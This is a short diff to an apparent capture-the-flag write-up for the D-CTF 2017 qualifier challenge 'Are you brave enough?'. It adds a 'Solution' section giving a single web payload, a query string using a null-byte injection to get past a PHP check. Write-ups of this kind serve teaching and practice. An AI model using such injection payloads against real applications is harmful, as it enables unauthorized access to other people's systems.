@@ -24,6 +24,11 @@ if($q->num_rows) {
     die('<h3>Nop.</h3>');
 }
 ```
+# Solution
+```
+/index.php?id=id;%00
+```
+
 
 # Refference 
 + D-CTF 2017 quals:Are you brave enough? 
